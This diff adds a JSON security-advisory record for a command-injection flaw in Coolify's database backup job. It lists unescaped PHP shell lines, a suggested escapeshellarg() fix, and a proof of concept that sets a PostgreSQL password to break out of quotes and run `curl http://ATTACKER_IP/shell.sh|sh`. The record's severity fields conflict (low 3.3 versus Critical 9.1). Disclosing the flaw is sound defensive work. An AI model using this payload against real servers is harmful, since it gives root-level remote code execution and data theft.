@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-4vff-6j8j-qhcg",
+  "repo": {
+    "cve_id": "CVE-2026-34149",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\n\n`DatabaseBackupJob.php` interpolates user-controlled database credentials - including usernames, passwords, and MongoDB collection exclusion names - directly into shell commands without escaping. The previous fix (GHSA-vm5p-43qh-7pmq) applied `escapeshellarg()` only to database names but left all other user-controlled fields unescaped. An authenticated user with database management permissions can achieve root-level remote code execution on any managed server.\n\n## Severity\n\n**Critical** - CVSS 9.1\n`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\n\n**CWE-78** - OS Command Injection\n\n## Affected Fields\n\n### 1. PostgreSQL Username - Direct Interpolation\n\n```php\n$backupCommand .= \" $this->container_name pg_dumpall --username {$this->database->postgres_user} | gzip > $this->backup_location\";\n```\n\n### 2. PostgreSQL Password - Double-Quote Breakout\n\n```php\n$backupCommand .= \" -e PGPASSWORD=\\\"{$this->postgres_password}\\\"\";\n```\n\n### 3. MySQL/MariaDB Root Password - Double-Quote Breakout\n\n```php\n$commands[] = \"docker exec $this->container_name mysqldump -u root -p\\\"{$this->database->mysql_root_password}\\\" --all-databases ...\";\n```\n\n### 4. MongoDB Collection Names - No Escaping\n\n```php\n$collectionsToExclude = str($databaseWithCollections)->after(':')->explode(',');\n.\" --excludeCollection \" . $collectionsToExclude->implode(' --excludeCollection ')\n```\n\n### 5. MongoDB Credentials in URI - No Quoting (mongo:4)\n\n```php\n$url = \"mongodb://{$this->mongo_root_username}:{$this->mongo_root_password}@{$this->container_name}:27017\";\n```\n\n## Proof of Concept (PostgreSQL Password)\n\n1. Create a PostgreSQL database via Coolify dashboard or API\n2. Set postgres_password to: `x\" $(curl http://ATTACKER_IP/shell.sh|sh) \"`\n3. Configure a scheduled backup for this database\n4. When the backup job runs, the payload executes as root on the managed server\n\n## Impact\n\n- Root-level RCE on all managed servers\n- Persistent: re-executes on every scheduled backup\n- Full data exfiltration\n- Lateral movement: compromise all servers managed by Coolify\n\n## Suggested Fix\n\nApply `escapeshellarg()` to all user-controlled fields before shell interpolation.\n\n## Timeline\n\n- 2026-03-03: Discovered and reported\n- 2026-06-01: 90-day disclosure deadline\n\n## Credit\n\nReported by **Assaf Alassaf** - Security Researcher",
+    "ghsa_id": "GHSA-4vff-6j8j-qhcg",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-4vff-6j8j-qhcg",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-4vff-6j8j-qhcg"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34149"
+      }
+    ],
+    "published_at": "2026-07-02T16:21:16Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Authenticated Host-Level RCE via Unescaped Database Credentials in Backup Jobs",
+    "updated_at": "2026-07-02T16:21:16Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": "< 4.0.0-beta.471"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
